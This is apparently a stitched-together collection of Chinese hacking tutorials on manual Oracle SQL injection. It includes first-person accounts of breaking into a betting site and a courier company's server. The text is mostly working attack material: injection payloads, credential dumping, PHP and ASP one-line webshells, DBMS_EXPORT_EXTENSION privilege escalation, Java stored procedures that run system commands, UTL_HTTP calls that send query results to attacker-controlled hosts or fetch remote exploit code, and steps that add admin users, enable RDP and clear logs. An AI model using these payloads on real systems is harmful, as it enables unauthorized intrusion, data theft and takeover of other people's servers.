@@ -1,0 +1,878 @@
+一次碰到Oracle，整理一些简单实用的。
+
+确定orcale
+
+识别--为注释符，不识别#
+
+length()为求字符串长度函数，非len()
+
+表
+
+dual: 系统表，只有一个选项
+
+表
+
+all_tables:
+
+table_name 表名
+
+owner 所有者，库名 
+
+
+表
+
+all_tab_cols:
+
+column_name 列名
+
+data_type 数据类型
+
+查看版本
+
+select banner from sys.v_$version where rownum=1
+
+查看IP以及主机名
+
+select to_char(utl_inaddr.get_host_address) from dual--
+
+select to_char(utl_inaddr.get_host_address) from dual--
+
+查看用户
+
+select username from all_users
+
+查看角色
+
+select role from session_roles
+
+查看库
+
+select owner from all_tables
+
+查看表
+
+select table_name from all_tables where owner=''
+
+查看列
+
+select column_name from all_tab_cols where table_name=''
+
+其他
+
+一下3个为不同级别，上例中因没有dba权限，故全用all来代替
+
+dba, 数据库管理员
+
+all, 全部用户
+
+user, 当前用户
+
+to_char() 转换为字符窜
+
+BLOB 大对象，属于LOB，二进制数据，如照片等。
+====================================================
+
+足彩在线网站是一个大型的足彩站点，在其中存在着注入点，链接如下：http://www.****china.com/jst/md_end.jsp?id=76，以该注入点为例，讲解如何进行Oracle手工注入攻击检测。
+
+ 
+
+判断注入点:
+
+第一种方法使用dual系统表
+
+一、判断注入数字型: and 1=1                     and 1=0 
+            字符型: 'and '1'='1                 'and '1'='0 
+            搜索型: xx%' and 1=1 and '%'='      xx%' and 1=2 and '%'='(xx必须是在页面中存在的字符串) 文本型:url'%2B'返回正常 url"%2B'asdfg返回出错(asdfg是随便输入的字符串)
+
+在链接地址后加上单引号，返回信息"java.sql.SQLException: ORA-01756"，可初步判断为Oracle的数据库。
+
+在链接后添加提交"/*"，返回错误页面，说明数据库不是MySQL的。继续在注入点链接后添加"--"，显示正常页面，说明数据库可能为MSSQL和Oracle。再提交：
+
+http://www.****china.com/jst/md_end.jsp?id=76 and (select count (*) from user_tables)>0--
+
+http://www.****china.com/jst/md_end.jsp?id=76 and (select count (*) from dual)>0--
+
+都返回正常页面（图1），确认为Oracle的数据库。
+Oracle注入点信息基本检测  来源：考试大  2010/11/5  【考试大：中国教育考试第一门户】  模拟考场  视频课程  字号:T T　　1 Oracle注入点信息基本检测
+
+　　对于Oracle注入点的检测比较特殊，不像其它注入点一样，需要经过多个步骤检测确认注入点所使用的数据库类型是否为Oracle。
+
+　　1.1 Oracle注入点判断
+
+　　首先，需要判断是否为Oracle注入点，可提交如下几步查询：
+
+　　and 1=1
+
+　　and 1=2
+
+　　返回不一样的页面，则说明存在注入漏洞，继续在注入点处提交如下查询字符：
+
+　　/*
+
+　　“/*”是MySQL中的注释符，返回错误说明该注入点不是MySQL，继续提交如下查询字符：
+
+　　--
+
+　　“--”是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。继续提交如下查询字符：
+
+　　;
+
+　　“;”是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。再提交如下查询：
+
+　　and exists(select * from dual)
+
+　　或
+
+　　and (select count (*) from user_tables)>0--
+
+　　dual和user_tables是Oracle中的系统表，如果返回正常页面，则可以确定是Oracle注入点。
+
+
+
+
+字段数目与字段类型检测
+
+
+长度判断你可以选择union select null,null,null.....(用null,null,null而没有用1,2,3是为了避免类型的问题，当确定下来后可以逐个来替换类型,oracle是不会自动匹配类型滴) order by 我感觉比较省事，我一般都是order by
+
+先检测注入点处查询字段数目，提交：
+
+http://www.****china.com/jst/md_end.jsp?id=76 order by 10  //返回错误页面
+
+http://www.****china.com/jst/md_end.jsp?id=76 order by 5  //返回正常页面
+
+http://www.****china.com/jst/md_end.jsp?id=76 order by 8  //返回错误页面
+
+http://www.****china.com/jst/md_end.jsp?id=76 order by 7  //返回正常页面
+
+说明当前表存在7个字段。下面再来检测字段类型，提交：
+
+http://www.****china.com/jst/md_end.jsp?id=76 and 1=2 union select 1,2,3,4,5,6,7 from dual
+
+返回错误信息，提示（图2）：
+
+expression must have same datatype
+
+
+很显然，提交的字段类型不正确，所以查询出错。于是改为提交：
+
+http://www.****china.com/jst/md_end.jsp?id=76 and 1=2 union select null,null,null,null,null,null,null from dual
+
+返回正常页面，说明字段数目确实为7个，但是需要确定字段类型。依次提交如下：
+
+http://www.****china.com/jst/md_end.jsp?id=76 and 1=2 union select 'null',null,null,null,null,null,null from dual  //返回正常页面
+
+http://www.****china.com/jst/md_end.jsp?id=76 and 1=2 union select null,'null',null,null,null,null,null from dual  //返回错误页面
+
+http://www.****china.com/jst/md_end.jsp?id=76 and 1=2 union select null,null,'null',null,null,null,null from dual  //返回正常页面
+
+http://www.****china.com/jst/md_end.jsp?id=76 and 1=2 union select null,null,null,'null',null,null,null from dual  //返回正常页面
+
+&hellip;&hellip;
+
+上面的查询中，用'null'字符串检测该字段处是否为字符型，如果返回正常页面则说明为字符型数据，返回错误页面，则说明该处为数字型。
+
+提交检测完毕后，确认1，3，4，6，7位置处为字符型。提交如下：
+
+http://www.****china.com/jst/md_end.jsp?id=76 and 1=2 union select '1',2,'3','4',5,'6','7' from dual
+
+返回正常页面（图3），说明字段类型正确。
+
+检测注入点信息
+
+对注入点进行简单的信息检测，可选择字符型字段处显示要查询的信息，
+
+判断dual表是不是存在(这篇文章是针对dual表存在的情况进行注入的,如果不存在的话，工具要是跑不来的话就是体力活了) url and exist (select * from dual)
+
+查询获取表名
+
+先来查询一下当前数据库中的表名，提交：
+
+http://www.****china.com/jst/md_end.jsp?id=76 and 1=2 union select '1',2,'3',(select table_name from user_tables where rownum=1),5,'6','7' from dual
+
+这里选择了字段4处返回信息，得到第1个表名为ACCOUNTS（图5）。
+
+http://www.****china.com/jst/md_end.jsp?id=76 and 1=2 union select '1',2,'3',(select table_name from user_tables where rownum=1 and table_name<>'ACCOUNTS'),5,'6','7' from dual
+
+注意，表名一定要大写。提交后返回第2个表名为A_USER。再提交：
+
+http://www.****china.com/jst/md_end.jsp?id=76 and 1=2 union select '1',2,'3',(select table_name from user_tables where rownum=1 and table_name<>'ACCOUNTS' and table_name<>'A_USER'),5,'6','7' from dual
+
+得到第3个表名BOBO_URL_INFO。用同样的方法，可得到其它所有表名，发现其中有一个极为重要的表名USERMG。
+
+
+
+提交如下：
+
+http://www.****china.com/jst/md_end.jsp?id=76 and 1=2 union select (select banner from sys.v_$version where rownum=1),2,(select SYS_CONTEXT ('USERENV', 'CURRENT_USER') from dual), (select member from v$logfile where rownum=1),5,'6', (select instance_name from v$instance) from dual
+
+从返回页面中得到各种信息（图4）：
+
+数据库版本为Oracle Database 10g Enterprise Edition Release 10.2.0.4.0 - 64bi；
+
+前数据库连接用户名为TOTO；
+
+操作系统平台为Linux；
+
+服务器sid为racdb2。
+
+
+也可以采用与前面MSSQL注入相似的方法，直接包含pass的表名，提交查询如下：
+
+　　and (select column_name from user_tab_columns where column_name like'%25pass%25')>0
+
+　　如果返回页面正常的话，则说明当前数据库中有包含pass的表名。再提交：
+
+　　and 1=2 union select 1,2,3,(select column_name from user_tab_columns where column_name like'%25pass%25'),4,5…… from dual
+
+　　即可得到包含pass的表名
+
+
+选择对USERMG表进行查询，提交：
+
+http://www.****china.com/jst/md_end.jsp?id=76 and 1=2 union select '1',2,'3',(select column_name from user_tab_columns where table_name='USERMG' and rownum=1),5,'6','7' from dual
+
+返回USERMG表中第一个字段名USER_NAME，再提交：
+
+http://www.****china.com/jst/md_end.jsp?id=76 and 1=2 union select '1',2,'3',(select column_name from user_tab_columns where table_name='USERMG' and column_name<>'USER_NAME' and rownum=1),5,'6','7' from dual
+
+返回第2个字段名USER_PASS（图6）。这两个字段名很明显是用来存储用户名和seo/'>密码的，直接查询其内容：
+
+http://www.****china.com/jst/md_end.jsp?id=76 and 1=2 union select USERNAME,2,'3',USER_PASS,5,'6','7' from USERMG
+
+返回页面中，得到了用户名和密码为：admin/toto11admin（图7）。
+
+
+登陆后台上传WebShell
+
+没有直接查找到网站的后台，但是利用管理员帐号，可以从前台进行登录。登录进入后，发现可进入体彩论坛，在论坛中在论坛后台管理页面，直接用此帐号进行登陆，进入论坛管理后台。
+
+在"论坛管理"→"界面风格"→"默认风格"→"详情"中，点击"新增变量"，将变量内容设置为：
+
+', '#999');eval($_POST[c]);
+
+替换内容可随便填（图8）。点击"提交"按钮后，一句话木马就被写入模板风格文件中了。用一句话木马连接论坛风格页面文件：
+
+http://bbs.****china.com/forumdata/cache/style_1.php
+
+密码为c，粘贴入要上传的WebShell代码内容，即可连接一句话木马获得WebShell（图9）。WebShell的权限比较大，可轻易的控制远程网站服务器。
+
+
+
+
+对著名快递公司的一次艰难的oracle注入
+===========================================================================================
+信息来源：邪恶八进制信息安全团队（www.eviloctal.com）
+
+● 轻车熟路   
+
+一个对X飞鸿有意见的亲密朋友找我说能不能把这个公司的网站给搞了，我一听公司，心想，企业站都是垃圾，好搞，便痛快答应（人品真好！），呵呵，但是后来才发现没我想像的那么简单。
+
+站面如图:
+
+ 
+
+
+asp的页面，啊d和google扫注入点没有，意料之中，工具误差太大！于是旁注，结果只有这一个站，然后便边开着流光扫服务器边习惯性的去站上乱逛去手工找注入点，一会的功夫出来一条链接，如图： lyttzx.com 
+
+ 
+
+习惯性的单引号，如图:
+
+ 
+
+很明显的注入，猜测源码大体是这样的:select XX from XXX where wen='云南';而且数据库类型为oracle，顿时来了精神，很少有这种练手的机会！估计服务器配置肯定不错！由于这种类型的数据库没什么好的工具，就直接来手工吧，那样比较刺激，据我朋友说这个公司很大，网络也很大，数据库量更是大上加大，难怪用oracle呢，所以放弃后台提权的想法！
+
+先用 union查询确定字段数和暴一些敏感资料，提交如下url：http://211.154.103.??/server2.asp?wen=四川省' order by 20--;返回正确，说明此表字段名大于20，继续提交http://211.154.103.??/server2.asp?wen=四川省' order by 30--；仍然返回正确，经过一些列的猜测然后提交，49返回正确，50出错，确定字段为49个，然后提交以下url：http://211.154.103.??/server2.asp?wen=四川省' union select NULL,NULL,……,NULL from dual-中间省略，一共49个null，  由于union查询需要数据类型匹配，否则出错，所以这里用null而不用数字可以避免类型错误，然后提交http://211.154.103.??/server2.asp?wen=四川省'  and 1=2 union select 1,NULL,……,NULL from dual--；出错显示类型不匹配，换成http://211.154.103.??/server2.asp?wen=四川省'  and 1=2 union select '1',NULL,……,NULL from dual--;返回正确,说明第一个是字符型的，但是下面对应位置并没有显示，继续按以上方法尝试后面48个，当试到12和13时，下面对应位置显示了，如图: lyttzx.com 
+ 
+
+好了，现在我们就要用下面那两个地方爆我们需要的东西，看下oracle版本，提交http://211.154.103.??/server2.asp?wen=四川省'  and 1=2 union select '1',NULL,……,'11', (select banner from sys.v_$version where rownum=1),'13'……NULL from dual--;
+结果如图:
+
+ 
+
+继续提交select member from v$logfile where rownum=1获得操作系统版本，
+如图
+
+ 
+
+确定是windows，下面查看服务器sid，提交select instance_name from v$instance copyright lyttzx.com 
+
+如图
+
+ 
+
+待会远程连接要用的，下面确定下主机ip，telnet 漏洞页上显示的ip地址的1521端口，为oracle的端口，，成功，1521开放，下面就本地架设个oracle客户端，利用oracle的那些默认帐号密码登录，尝试n次均失败告终，管理员安全意思不错，表扬下！^.^
+
+下面就利用oracle的内置函数SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES过滤不严的漏洞，至于这个函数的具体漏洞形成的原因，这里就不占篇幅了，想知道的可以去我博客，对oracle不熟悉的可以跳过这一部分，继续构造提交：http://211.154.103.??/server2.asp?wen= 四川省 '%20and%20''||SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA%20AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''CREATE USER REBEYOND IDENTIFIED BY REBEYOND'''';END;'';END;--','SYS',0,'1',0)=''--； 
+
+本文来自泠云天天在线
+
+
+这里讲解下，and后面把函数求逻辑或然后与空比较，这样系统会先求函数值，便会执行我们构造在函数里的语句，这样就往数据库加了个用户名为rebeyond密码为rebeyond的用户，然后执行http://211.154.103.??/server2.asp?wen= 四川省' and ''||SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant sysdba to rebeyond'''';END;'';END;--','SYS',0,'1',0)=''--便把我们建的用户加为dba权限，下面赋予用户远程连接权限，提交http://211.154.103.??/server2.asp?wen= 四川省' and ''||SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''GRANT CONNECT TO rebeyond'''';END;'';END;--','SYS',0,'1',0)=''--，好了，下面远程连接！
+
+● 峰回路转 内容来自泠云天天在线 
+本以为建了dba权限的用户，远程连接继续拿权限就完了，但是当我以dba身份登录时却出现这个，如图：
+
+ 
+
+百度了下才知道是服务器那边配置的问题，由于是服务器端的问题，一时不好解决，就暂时先用normal方式登录，连接成功，进去去权限设置那把权限能勾的都勾上，如图：
+
+ 
+
+
+因为我们毕竟是dba权限的，虽然没以dba方式登录，但是除了开关数据库，其他权限还是都有的，然后就是想办法提权拿服务器，虽然oracle不支持 xp_cmdshell直接执行系统命令，但是对plsql的支持是非常另人激动的，因为可以通过建立java存储过程来执行命令，注意这时建完 shell后要对数据库用户赋予对磁盘文件操作的权限(在sqlplus里执行)：call dbms_java.grant_permission('REBEYOND','java.io.FilePermission','c:/a.txt','read,write');  。 cmd打开sqlplus（和oracle客户端一起安装的），输入sqlplus /nolog,然后输入connect rebeyond/rebeyond@(description=(address_list= (address=(protocol=tcp)(host=211.154.103.15)(port=1521)))(connect_data= (SERVICE_NAME=ORCL[/email])));是不是用到了我们前面爆出的服务器sid呢，hoho，连接成功，下面开始执行命令，创建 java存储过程,代码如下： 
+泠云工作室
+
+
+
+java存储过程：
+第一步：
+create or replace and compile
+java souRCe named "util"
+as
+import java.io.*;
+import java.lang.*; 
+public class util extends Object
+{
+public static int RunThis(String args)
+{
+Runtime rt = Runtime.getRuntime();
+int RC = -1; 
+内容来自泠云天天在线
+
+try
+{
+Process p = rt.exec(args);
+int bufSize = 4096; 
+BufferedInputStream bis =new BufferedInputStream(p.getInputStream(), bufSize);
+int len;
+byte buffer[] = new byte[bufSize];
+// Echo back what the program spit out
+while ((len = bis.read(buffer, 0, bufSize)) != -1) 
+copyright lyttzx.com
+
+System.out.write(buffer, 0, len); 
+RC = p.waitFor();
+}
+catch (Exception e)
+{
+e.printStackTrace();
+RC = -1;
+}
+finally
+{
+return RC;
+} 
+泠云工作室
+
+}
+}
+
+第二步：
+
+create or replace
+function RUN_CMz(p_cmd in varchar2) return number
+as
+language java
+name 'util.RunThis(java.lang.String) return integer';
+
+第三步：
+create or replace procedure RC(p_cmd in varChar)
+as
+x number;
+begin lyttzx.com 
+x := RUN_CMz(p_cmd);
+end;
+
+创建完之后，就可以通过x := RUN_CMz(dos命令)来执行系统命令了。
+
+建 完存储过程后系统命令执行成功， 如图
+
+   
+
+但是后来发现这个shell很不爽，如果遇到需要交互的命令就会卡死，刚开始想用"ftp 我的ip地址"检测下能不能执行，结果卡死，我这边防火墙也没反应，不解，后tasklist，发现ftp.exe，确定对方不能连接外网，可能有防火墙或作了设置.
+
+于是用ftp传马思路抛弃，打个systeninfo命令看下系统，是2003，于是打算先建个超级用户然后开3389，执行exec :x := RUN_CMD('net user')结果卡死，猜测net被删，执行exec :x := RUN_CMD('net1 user');成功，执行exec :x := RUN_CMD('net1 user rebeyond rebeyond  /add&net1 localgroup administrators rebeyond /add');成功，下面用reg命令读下3389的状态和端口，执行exec :x := RUN_CMD('reg query "HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal Server"');发现fDenyTSconnections值为1，说明3389关闭 泠云工作室 
+
+于是依次执行以下语句开3389：
+reg add "HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal ServerWdsrdpwdTdstcp" /v PortNumber /t REG_DWORD /d 3389 /f
+reg add "HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp" /v PortNumber /t REG_DWORD /d 3389 /f
+
+因为cmd一交互就卡死，所以加了个/f强行参数，搞定后运行mstsc连接，结果另人吐血，能连上但是却没有登录窗口，提示说什么" awgina.dll被替换成未知版本",猜测可能把3389用到的dll给删除了，因为虽然不能登录但可以连接，于是想到了替换sethc.exe，在 shell下依次执行：
+
+exec :x :=RUN_CMD ('del c:windowssystem32sethc.exe /f')
+exec :x :=RUN_CMD('del C:WINDOWSsystem32dllcachesethc.exe /f')
+exec :x :=RUN_CMD('copy c:windowsexplorer.exe c:windowssystem32sethc.exe') 
+本文来自泠云天天在线
+
+
+按五次shift后发现没替换成功，也没删除成功，推断原因只有一个，就是没权限，但是我在前面用java建shell前专门赋予了权限的，不解，百度一番！发现赋予文件操作权限必须得以dba的方式登录，但是前面说了我们无法以dba方式登录，顿时大脑一片空白，没有写和删除权限，只有运行权限，思路一下少了很多，继续！！忽然想到了telnet，用reg查看了下telnet服务的状态为禁用，于是执行reg add "HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesTlntSvr" /v Start /t REG_DWORD /d 2 /f把telnet服务设置为自动，然后就是想办法让服务器重启开telnet。
+
+●柳暗花明：
+
+shell里执行rundll32.exe user.exe,restartwindows,不一会主机重启了，成功telnet，这样权限我们已经拿到了！但是要向图像界面进军，在telnet 执行netstat -an看了下端口，发现5632，熟悉提权的人应该很熟悉，这是pcanywhere的默认端口，但是怎么才能知道pcanywhere的密码呢？因为不能连接外网，所以直接传cif文件是不可能的，于是想到了webshell！在telnet里找到站的 目录d:site,执行echo "<%eval(request("#"))%>" >d:siteguestboook.asp,访问成功，然后用海洋一句话提交大马成功如图： 
+copyright lyttzx.com
+
+
+
+ 
+
+跳转到pcanywhere的cif文件目录下载cif文件并破解，成功得到pcanywhere的密码，如图：
+
+ 
+
+到这基本就结束了，但是pcanywhere远程很不爽，于是还是想开用3389，于是百度搜索原因，发现是3389和pcanywhere冲突的原因并找到了解决办法，删除某个注册表项就搞定了，在pcanywhere操作就很简单了，搞定后重启服务器，连接对方3389，终于看到了熟悉的登录界面，用前面建的用户成功登入！如图：
+ 
+内容来自泠云天天在线
+
+
+
+至此整个入侵过程宣告结束！清了下日志修补了下漏洞！闪人！睡觉！  
+内容来自泠云天天在线
+
+
+(责任编辑：泠云)
+
+
+
+------------------------------------------------------第二种方法配合utl_http存储过程----------------
+
+如果想检测一下UTL_HTTP包是否存在可以使用语句" select count(*) from all_objects where object_name='UTL_HTTP' "来判断。OK既然是反回信息我们先在本地用NC监听，然后使用"and UTL_HTTP.request('http://IP:2009/'||(查询语句))=1--"这样的形式。
+
+本地先 nc -l -vv -p 2009，然后提交"and UTL_HTTP.request('http://IP:2009/'||(select banner from sys.v_$version where rownum=1))=1--"
+
+成功返回数据库的版本。现在我们就来一点一点的爆。先爆库，再爆表，再爆字段(上文字段已经把字段确定出来了是USERNAME和PASSWORD)，最后爆字段值。现在我们就来爆库，提交
+
+"and UTL_HTTP.request('http://ip:2009/'||(select owner from all_tables where rownum=1))=1--"
+
+假设爆出第一个库的名字为SYS。继续爆第二个库名，提交
+
+"and UTL_HTTP.request('http://IP:2009/'||(select owner from all_tables where owner<>'SYS' and rownum=1))=1--"以此类推,爆出所有的库
+
+爆表语句如下
+
+提交"and UTL_HTTP.request('http://IP:2009/'||(select TABLE_NAME from all_tables where owner='SYS'and rownum=1))=1--"
+
+SYS库中第一个表为xxx。继续提交
+
+"and UTL_HTTP.request('http://IP:2009/'||(select TABLE_NAME from all_tables where owner='SYS'and rownum=1 and TABLE_NAME<>'xxx'))=1--"
+
+以此类推爆出SYS库中所有的表;如果需要爆表里有多少个列可以用
+
+"and UTL_HTTP.request('http://IP:2009/'||(select count(*) from user_tab_columns where table_name='表名'))=1--"
+
+或者想要爆第一个列名可以使用
+
+"and UTL_HTTP.request('http://IP:2009/'||(select * from user_tab_columns where table_name='表名' and rownum=1))=1--"
+
+爆第二个列名使用
+
+"and UTL_HTTP.request('http://IP:2009/'||(select * from user_tab_columns where table_name='表名' and rownum=1 and COLUMN_NAME<>'第一个爆出的列名'))=1--"
+
+以此类推就可以爆出所有的列名。现在我们继续爆用户和密码，提交
+
+"and UTL_HTTP.request('http://IP:2009/'||(select 字段名1 from TBL_USER_MANAGER_BASE where rownum=1))=1--"
+
+爆密码提交
+
+"and UTL_HTTP.request ('http://IP:2009/'||(select PASSWORD from TBL_USER_MANAGER_BASE where rownum=1))=1--"
+
+首先想到的就是SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES函数，我们可以通过web注射直接获得系统权限，呵呵，非常诱人吧!我们先来看看这个函数的利用。如下。
+
+SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);[多语句]END;--','SYS',0,'1',0)
+
+多语句里写上我们的exploit，但是这样会造成我们构造的语句非常庞大，所以这里我们可以使用utl_http.request来获取我们放在远程及其上的exploit。到这里我们的语句就构造完了。
+
+"and SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1); utl_http.request ('http://www.li-tek.com/1.txt') END;--','SYS',0,'1',0)=0--"
+
+但是提交后返回该页无法显示。换成char() 形式后and SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(39)||chr(70)||chr(79),chr(79)||chr(39)||chr(44),chr(39)||chr(66)||chr(65)||chr(82)||chr(39)||chr(44)||chr(39)||chr(68)||chr(66)||chr(77)||chr(883)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)
+
+||chr(41)||chr(59)||utl_http.request(chr(39)||chr(104)||chr(116)||chr(116)||chr(112)||chr(58)||chr(47)||chr(47)||chr(119)||chr(119)||chr(119)||chr(46)||chr(108)||chr(105)||chr(45)||chr(116)||chr(101)||chr(107)||chr(46)||chr(99)||chr(111)||chr(109)||chr(47)||chr(49)||chr(46)||chr(116)||chr(120)||chr(116)||chr(39))||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45)||chr(39),chr(39)||chr(83)||chr(89)||chr(83)||chr(39),0,chr(39)||chr(49)||chr(39),0)=0--
+
+远程地址的1.txt内容为
+
+EXECUTE IMMEDIATE 'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''Create or REPLACE AND RESOLVE JAVA SOURCE NAMED "JAVACMD" AS import java.lang.*;import java.io.*;public class JAVACMD{public static void execCommand (String command) throws IOException {Runtime.getRuntime().exec(command);}};'';END;'
+
+
+------------------------------------------------------
+
+
+我们首先来确认这个用户的权限
+http://127.0.0.1:8080/VOA/test.jsp?id=282 and exists(select * from dba_tables)
+在这里一个小细节
+讲讲ORACLE的系统表部分
+DBA开头的 只有DBA权限的用户才能访问例如 DBA_USERS DBA_TABLES
+而一般用户都能查询
+user_tables 跟 all_tables这两个系统表 前者是本用户自己的表！ 后者是自己的表以及人家授权给你查询的表！
+一般注射软件只需要查询这两个表就可以获取用户的表结构了
+
+
+
+
+                               
+                                 犀利的 oracle 注入技术 
+本篇文章来源于 黑客基地-全球最大的中文黑客站 原文链接：http://www.hackbase.com/tech/2008-10-17/41953.html
+*******************************************************************************
+介绍一个在web上通过oracle注入直接取得主机cmdshell的方法。
+　　以下的演示都是在web上的sql plus执行的，在web注入时 把select SYS.DBMS_EXPORT_EXTENSION.....改成
+　　/xxx.jsp?id=1 and '1'<>'a'||(select SYS.DBMS_EXPORT_EXTENSION.....)
+　　的形式即可。(用" 'a'|| "是为了让语句返回true值)
+　　语句有点长，可能要用post提交。
+　　以下是各个步骤：
+　　1.创建包
+　　通过注入 SYS.DBMS_EXPORT_EXTENSION 函数，在oracle上创建Java包LinxUtil，里面两个函数，runCMD用于执行系统命令，readFile用于读取文件：
+　　/xxx.jsp?id=1 and '1'<>'a'||(
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+　　create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(
+　　new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}public static String readFile(String filename){try{BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}
+　　}'''';END;'';END;--','SYS',0,'1',0) from dual
+　　)
+　　------------------------
+　　如果url有长度限制，可以把readFile()函数块去掉，即：
+　　/xxx.jsp?id=1 and '1'<>'a'||(
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+　　create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(
+　　new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}
+　　}'''';END;'';END;--','SYS',0,'1',0) from dual
+　　)
+　　同时把后面步骤 提到的 对readFile()的处理语句去掉。
+　　------------------------------
+　　2.赋Java权限
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''<<ALL FILES>>'''''''', ''''''''execute'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual
+　　3.创建函数
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+　　create or replace function LinxRunCMD(p_cmd in varchar2)  return varchar2  as language java name ''''''''LinxUtil.runCMD(java.lang.String) return String'''''''';   '''';END;'';END;--','SYS',0,'1',0) from dual
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+　　create or replace function LinxReadFile(filename in varchar2)  return varchar2  as language java name ''''''''LinxUtil.readFile(java.lang.String) return String'''''''';   '''';END;'';END;--','SYS',0,'1',0) from dual
+　　4.赋public执行函数的权限
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxRunCMD to public'''';END;'';END;--','SYS',0,'1',0) from dual
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxReadFile to public'''';END;'';END;--','SYS',0,'1',0) from dual
+　　5.测试上面的几步是否成功
+　　and '1'<>'11'||(
+　　select  OBJECT_ID from all_objects where  object_name ='LINXRUNCMD'
+　　)
+　　and '1'<>(
+　　select  OBJECT_ID from all_objects where  object_name ='LINXREADFILE'
+　　)
+　　6.执行命令：
+　　/xxx.jsp?id=1 and '1'<>(
+　　select  sys.LinxRunCMD('cmd /c net user linx /add') from dual
+　　)
+　　/xxx.jsp?id=1 and '1'<>(
+　　select  sys.LinxReadFile('c:/boot.ini') from dual
+　　)
+　　注意sys.LinxReadFile()返回的是varchar类型，不能用"and 1<>" 代替 "and '1'<>"。
+　　如果要查看运行结果可以用 union :
+　　/xxx.jsp?id=1 union select  sys.LinxRunCMD('cmd /c net user linx /add') from dual
+　　或者UTL_HTTP.request(:
+　　/xxx.jsp?id=1 and '1'<>(
+　　SELECT UTL_HTTP.request('http://211.71.147.3/record.php?a=LinxRunCMD:'||REPLACE(REPLACE(sys.LinxRunCMD('cmd /c net user aaa /del'),' ','%20'),'\n','%0A')) FROM dual
+　　)
+　　/xxx.jsp?id=1 and '1'<>(
